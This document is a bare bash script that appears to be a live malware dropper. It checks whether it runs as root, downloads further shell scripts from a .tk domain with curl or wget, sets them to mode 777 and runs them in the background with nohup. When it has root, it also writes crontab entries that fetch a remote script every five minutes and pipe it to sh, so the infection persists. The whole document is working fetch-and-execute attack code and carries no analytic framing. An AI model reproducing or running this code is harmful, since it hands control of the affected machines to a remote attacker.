#!/bin/bash
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
#export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin
#chmod +x /tmp/hawk && ps auxf | grep -v grep | grep hawk || nohup /tmp/hawk >/dev/null 2>&1 &
#rm -rf /tmp/config.txt
whoami=$( whoami )
if [ ${whoami}x != "root"x ];then
	curl http://3g2upl4pq6kufc4m.tk/lowerv2.sh > /tmp/lower.sh
  chmod 777 /tmp/lower.sh
  nohup bash /tmp/lower.sh >/dev/null 2>&1 &
	if [ ! -f "/tmp/lower.sh" ] ;then
		wget -P /tmp/ http://3g2upl4pq6kufc4m.tk/lowerv2.sh
		#rm /tmp/lower.sh.*
    #rm /tmp/lowerv2.sh.*
	fi
  chmod 777 /tmp/lowerv2.sh
  nohup bash /tmp/lowerv2.sh >/dev/null 2>&1 &
else
  echo "*/5 * * * * curl -fsSL http://3g2upl4pq6kufc4m.tk/r88.sh|sh" > /var/spool/cron/root
  mkdir -p /var/spool/cron/crontabs
  echo "*/5 * * * * curl -fsSL http://3g2upl4pq6kufc4m.tk/r88.sh|sh" > /var/spool/cron/crontabs/root

	curl http://3g2upl4pq6kufc4m.tk/rootv2.sh > /tmp/root.sh
  chmod 777 /tmp/root.sh
  nohup bash /tmp/root.sh>/dev/null 2>&1 &
	if [ ! -f "/tmp/root.sh" ] ;then
		wget -P /tmp/ http://3g2upl4pq6kufc4m.tk/rootv2.sh
		#rm /tmp/root.sh.*
    #rm /tmp/rootv2.sh.*
	fi
	chmod 777 /tmp/rootv2.sh
	nohup bash /tmp/rootv2.sh >/dev/null 2>&1 &
fi
